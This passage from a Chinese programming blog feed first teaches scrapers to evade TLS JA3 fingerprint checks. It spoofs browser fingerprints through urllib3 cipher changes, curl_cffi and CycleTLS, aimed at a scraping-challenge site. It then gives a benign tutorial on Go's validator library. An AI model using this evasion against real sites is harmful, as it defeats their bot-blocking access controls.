class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>将<code>ec_point_formats</code>转换转换十进制。</p><p><img src="/./../blog_image/image-20231102174113014.png" alt="image-20231102174113014"></p><h1 id="3-突破指纹"><a href="#3-突破指纹" class="headerlink" title="3.突破指纹"></a>3.突破指纹</h1><p>理解TLS中ja3生成机制后，绕过的思路也就有了：<strong>requests请求时，改变 <code>ja3 string</code>得内容，生成合法的的<code>ja3</code>指纹</strong>。</p><h2 id="3-1-【PY】requests【案例3】"><a href="#3-1-【PY】requests【案例3】" class="headerlink" title="3.1 【PY】requests【案例3】"></a>3.1 【PY】requests【案例3】</h2><p>requests在发送请求时，内部依赖urllib3实现。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">1</span>.<span class="hljs-number">26</span>.<span class="hljs-number">15</span><br><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">1</span>.<span class="hljs-number">26</span>.<span class="hljs-number">16</span><br><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231102182216117.png" alt="image-20231102182216117"></p><p>自定义 <code>ciphers</code>实现生成非默认<code>ja3</code></p><p>方式1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><br>urllib3.util.ssl_.DEFAULT_CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join([<br>    <span class="hljs-comment"># &quot;ECDHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AES&quot;,</span><br>    <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>    <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!MD5&quot;</span>,<br>    <span class="hljs-string">&quot;!DSS&quot;</span>,<br>])<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>方式2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter<br><span class="hljs-keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="hljs-keyword">import</span> create_urllib3_context<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MineAdapter</span>(<span class="hljs-title class_ inherited__">HTTPAdapter</span>):<br>    CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join(<br>        [<br>            <span class="hljs-string">&quot;ECDHE+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;ECDHE+CHACHA20&quot;</span>,<br>            <span class="hljs-string">&quot;DHE+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;DHE+CHACHA20&quot;</span>,<br>            <span class="hljs-string">&quot;ECDH+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;DH+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;ECDH+AES&quot;</span>,<br>            <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>            <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>            <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>            <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>            <span class="hljs-string">&quot;!MD5&quot;</span>,<br>            <span class="hljs-string">&quot;!DSS&quot;</span>,<br>        ]<br>    )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_poolmanager</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        context = create_urllib3_context(ciphers=self.CIPHERS)<br>        kwargs[<span class="hljs-string">&#x27;ssl_context&#x27;</span>] = context<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().init_poolmanager(*args, **kwargs)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_manager_for</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        context = create_urllib3_context(ciphers=self.CIPHERS)<br>        kwargs[<span class="hljs-string">&#x27;ssl_context&#x27;</span>] = context<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().proxy_manager_for(*args, **kwargs)<br><br><br>session = requests.Session()<br>session.headers.update(&#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>&#125;)<br>session.mount(<span class="hljs-string">&quot;https://&quot;</span>, MineAdapter())<br><br>res = session.get(<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>用此方法，可以过案例3的TLS校验机制，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><br>urllib3.util.ssl_.DEFAULT_CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join([<br>    <span class="hljs-comment"># &quot;ECDHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AES&quot;,</span><br>    <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>    <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!MD5&quot;</span>,<br>    <span class="hljs-string">&quot;!DSS&quot;</span>,<br>])<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>注意：Python层得TLS是基于底层openssl对外提供的方法，而openssl暴漏给Python只能通过修改 <code>ciphers</code> 来修改ja3指纹，无法支持修改 <code>SSLExtension, EllipticCurve, EllipticCurvePointFormat</code>。</p><h2 id="3-2-【PY】curl-cffi【案例1-2-3】"><a href="#3-2-【PY】curl-cffi【案例1-2-3】" class="headerlink" title="3.2 【PY】curl_cffi【案例1+2+3】"></a>3.2 【PY】curl_cffi【案例1+2+3】</h2><p><a href="https://pypi.org/project/curl-cffi/#description">https://pypi.org/project/curl-cffi/#description</a></p><ul><li>curl是一个可以发送网络请求的工具。</li><li>curl-impersonate是一个基于curl基础上进行开发的一个工具，可以完美的模拟主流的浏览器。</li><li>curl_cffi，是套壳curl-impersonate，让此工具可以更方便的应用在Python中。</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> curl-cffi<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> curl_cffi <span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    <span class="hljs-comment"># url=&quot;https://ascii2d.net/&quot;,</span><br>    <span class="hljs-comment"># url=&quot;https://cn.investing.com/equities/amazon-com-inc-historical-data&quot;,</span><br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;,<br>    impersonate=<span class="hljs-string">&quot;chrome101&quot;</span>,<br>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="3-3-【Go】CycleTLS-【案例1-2-3】"><a href="#3-3-【Go】CycleTLS-【案例1-2-3】" class="headerlink" title="3.3 【Go】CycleTLS 【案例1+2+3】"></a>3.3 【Go】CycleTLS 【案例1+2+3】</h2><p>关于Golang环境和基础入门教程可以参考：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">课件：https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">5</span>xclass.cn<span class="hljs-regexp">/wiki/</span>detail<span class="hljs-regexp">/4/</span><span class="hljs-number">0</span>/<br>视频：https:<span class="hljs-regexp">//</span>www.bilibili.com<span class="hljs-regexp">/video/</span>BV1u5411W79w/<br></code></pre></td></tr></table></figure><p>github上有一个基于Golang开发的开源模块CycleTLS ，可以更靠近底层去实现定制<code>ja3</code>指纹，直接自定义<code>ja3 fullstring</code>。</p><p><a href="https://github.com/Danny-Dasilva/CycleTLS">https://github.com/Danny-Dasilva/CycleTLS</a></p><p><img src="/./../blog_image/image-20231103184851991.png" alt="image-20231103184851991"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/Danny-Dasilva/CycleTLS/cycletls <br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/Danny-Dasilva/CycleTLS/cycletls&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>client := cycletls.Init()<br><br>    <span class="hljs-comment">// https://ascii2d.net/</span><br>    <span class="hljs-comment">// https://cn.investing.com/equities/amazon-com-inc-historical-data</span><br>    <span class="hljs-comment">// https://match.yuanrenxue.cn/api/match/19?page=1</span><br>response, err := client.Do(<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>, cycletls.Options&#123;<br>Body:      <span class="hljs-string">&quot;&quot;</span>,<br>Ja3:       <span class="hljs-string">&quot;771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-10,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0&quot;</span>,<br>UserAgent: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,<br>&#125;, <span class="hljs-string">&quot;GET&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Print(<span class="hljs-string">&quot;Request Failed: &quot;</span> + err.Error())<br>&#125;<br>log.Println(response)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
      <tag>golang开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>validator实现参数校验</title>
    <link href="/2023/12/02/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/"/>
    <url>/2023/12/02/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="一-导入包："><a href="#一-导入包：" class="headerlink" title="一.导入包："></a>一.导入包：</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> get github.com/<span class="hljs-keyword">go</span>-playground/validator/v10<br></code></pre></td></tr></table></figure><h1 id="二-基本语法："><a href="#二-基本语法：" class="headerlink" title="二.基本语法："></a>二.基本语法：</h1><table><thead><tr><th align="center">标记</th><th align="center">标记说明</th><th align="center">例</th></tr></thead><tbody><tr><td align="center">required</td><td align="center">必填</td><td align="center">Field或Struct <code>validate:&quot;required&quot;</code></td></tr><tr><td align="center">omitempty</td><td align="center">空时忽略</td><td align="center">Field或Struct <code>validate:&quot;omitempty&quot;</code></td></tr><tr><td align="center">len</td><td align="center">长度</td><td align="center">Field <code>validate:&quot;len=0&quot;</code></td></tr><tr><td align="center">eq</td><td align="center">等于</td><td align="center">Field <code>validate:&quot;eq=0&quot;</code></td></tr><tr><td align="center">gt</td><td align="center">大于</td><td align="center">Field <code>validate:&quot;gt=0&quot;</code></td></tr><tr><td align="center">gte</td><td align="center">大于等于</td><td align="center">Field <code>validate:&quot;gte=0&quot;</code></td></tr><tr><td align="center">lt</td><td align="center">小于</td><td align="center">Field <code>validate:&quot;lt=0&quot;</code></td></tr><tr><td align="center">lte</td><td align="center">小于等于</td><td align="center">Field <code>validate:&quot;lte=0&quot;</code></td></tr><tr><td align="center">eqfield</td><td align="center">同一结构体字段相等</td><td align="center">Field <code>validate:&quot;eqfield=Field2&quot;</code></td></tr><tr><td align="center">nefield</td><td align="center">同一结构体字段不相等</td><td align="center">Field <code>validate:&quot;nefield=Field2&quot;</code></td></tr><tr><td align="center">gtfield</td><td align="center">大于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtfield=Field2&quot;</code></td></tr><tr><td align="center">gtefield</td><td align="center">大于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtefield=Field2&quot;</code></td></tr><tr><td align="center">ltfield</td><td align="center">小于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltfield=Field2&quot;</code></td></tr><tr><td align="center">ltefield</td><td align="center">小于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltefield=Field2&quot;</code></td></tr><tr><td align="center">eqcsfield</td><td align="center">跨不同结构体字段相等</td><td align="center">Struct1.Field <code>validate:&quot;eqcsfield=Struct2.Field2&quot;</code></td></tr><tr><td align="center">min</td><td align="center">最小值</td><td align="center">Field <code>validate:&quot;min=1&quot;</code></td></tr><tr><td align="center">max</td><td align="center">最大值</td><td align="center">Field <code>validate:&quot;max=2&quot;</code></td></tr><tr><td align="center">isdefault</td><td align="center">是默认值</td><td align="center">Field <code>validate:&quot;isdefault=0&quot;</code></td></tr><tr><td align="center">oneof</td><td align="center">其中之一</td><td align="center">Field <code>validate:&quot;oneof=5 7 9&quot;</code></td></tr><tr><td align="center">containsfield</td><td align="center">字段包含另一个字段</td><td align="center">Field <code>validate:&quot;containsfield=Field2&quot;</code></td></tr><tr><td align="center">email</td><td align="center">字符串值包含一个有效的电子邮件</td><td align="center">Field <code>validate:&quot;email&quot;</code></td></tr><tr><td align="center">json</td><td align="center">字符串值是否为有效的 JSON</td><td align="center">Field <code>validate:&quot;json&quot;</code></td></tr><tr><td align="center">file</td><td align="center">符串值是否包含有效的文件路径，以及该文件是否存在于计算机上</td><td align="center">Field <code>validate:&quot;file&quot;</code></td></tr><tr><td align="center">url</td><td align="center">符串值是否包含有效的 url</td><td align="center">Field <code>validate:&quot;url&quot;</code></td></tr><tr><td align="center">ip</td><td align="center">字符串值是否包含有效的 IP 地址</td><td align="center">Field <code>validate:&quot;ip&quot;</code></td></tr><tr><td align="center">ipv4</td><td align="center">字符串值是否包含有效的 ipv4地址</td><td align="center">Field <code>validate:&quot;ipv4&quot;</code></td></tr><tr><td align="center">datetime</td><td align="center">字符串值是否包含有效的 日期</td><td align="center">Field <code>validate:&quot;datetime&quot;</code></td></tr></tbody></table><h1 id="三-使用注意"><a href="#三-使用注意" class="headerlink" title="三.使用注意"></a>三.使用注意</h1><ol><li>当搜索条件与特殊标记冲突时,如：逗号（,），或操作（|），中横线（-）等则需要使用 UTF-8十六进制表示形式</li></ol><p>如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Test <span class="hljs-keyword">struct</span> &#123;<br>   Field1 <span class="hljs-type">string</span>  <span class="hljs-string">`validate:&quot;excludesall=|&quot;`</span>    <span class="hljs-comment">// 错误</span><br>   Field2 <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;excludesall=0x7C&quot;`</span> <span class="hljs-comment">// 正确.</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>可通过validationErrors :&#x3D; errs.(validator.ValidationErrors)获取错误对象自定义返回响应错误</p></li><li><p>自定义校验结果翻译</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 初始化翻译器</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateInit</span><span class="hljs-params">()</span></span> &#123;<br>zh_ch := zh.New()<br>uni := ut.New(zh_ch)               <span class="hljs-comment">// 万能翻译器，保存所有的语言环境和翻译数据</span><br>Trans, _ = uni.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>) <span class="hljs-comment">// 翻译器</span><br>Validate = validator.New()<br>_ = zh_translations.RegisterDefaultTranslations(Validate, Trans)<br><span class="hljs-comment">// 添加额外翻译</span><br>_ = Validate.RegisterTranslation(<span class="hljs-string">&quot;required_without&quot;</span>, Trans, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> ut.Add(<span class="hljs-string">&quot;required_without&quot;</span>, <span class="hljs-string">&quot;&#123;0&#125; 为必填字段!&quot;</span>, <span class="hljs-literal">true</span>)<br>&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator, fe validator.FieldError)</span></span> <span class="hljs-type">string</span> &#123;<br>t, _ := ut.T(<span class="hljs-string">&quot;required_without&quot;</span>, fe.Field())<br><span class="hljs-keyword">return</span> t<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>如果需要校验多种，需要使用<code>,</code>进行分隔，如下：</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> UserLoginRequest <span class="hljs-keyword">struct</span> &#123;<br>    CaptchaCode <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;captcha_code&quot; validate:&quot;required,ValidateCaptchaCodeLength&quot;`</span><br>    UserName    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;user_name&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;用户名&quot;`</span><br>    Password    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;password&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;密码&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四-使用案例："><a href="#四-使用案例：" class="headerlink" title="四.使用案例："></a>四.使用案例：</h1><h2 id="4-1-实现国际化-中文："><a href="#4-1-实现国际化-中文：" class="headerlink" title="4.1 实现国际化&#x2F;中文："></a>4.1 实现国际化&#x2F;中文：</h2><p><code>translator := ut.New(zh.New())</code>可以实现中文翻译</p><p><code> trans, _ = translator.GetTranslator(&quot;zh&quot;)</code>这里有个坑，就是第二个参数是bool，不管是<code>en</code>还是<code>zh</code>都是会报错的，忽略可以正常运行。</p><p><code>RegisterTagNameFunc</code>就是获取我们自定义的字段的tag，后面就可以实现这个label的值加上报错信息了(label的值为中文)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitValidator</span><span class="hljs-params">()</span></span> (*validator.Validate, ut.Translator) &#123;<br>    validate = validator.New()<br>    translator := ut.New(zh.New())<br>    trans, _ = translator.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>)<br>    err := zhTrans.RegisterDefaultTranslations(validate, trans)<br>    <span class="hljs-comment">// 注册自定义方法 可以实现 label字段+错误信息</span><br>    validate.RegisterTagNameFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(fld reflect.StructField)</span></span> <span class="hljs-type">string</span> &#123;<br>       name := fld.Tag.Get(<span class="hljs-string">&quot;label&quot;</span>)<br>       <span class="hljs-keyword">return</span> name<br>    &#125;)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;registerDefaultTranslations fail: %s\n&quot;</span>, err.Error()))<br>    &#125;<br>    <span class="hljs-keyword">return</span> validate, trans<br>&#125;<br></code></pre></td></tr></table></figure><p>在gin中如何校验？</p><p>使用<code>validator.Struct</code>就可以对其进行校验了，如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := global.Validator.Struct(&amp;req); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, fieldError := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>response.FailWithMessage(fieldError.Translate(global.Translator), ctx)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>fieldError</code>我们可以获取当前报错的字段的信息如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-自定义校验方法："><a href="#4-2-自定义校验方法：" class="headerlink" title="4.2 自定义校验方法："></a>4.2 自定义校验方法：</h2><p>需要自定义校验方法，只需要使用<code>RegisterValidation</code>即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// RegisterValidation adds a validation with the given tag</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// NOTES:</span><br><span class="hljs-comment">// - if the key already exists, the previous validation function will be replaced.</span><br><span class="hljs-comment">// - this method is not thread-safe it is intended that these all be registered prior to any validation</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Validate)</span></span> RegisterValidation(tag <span 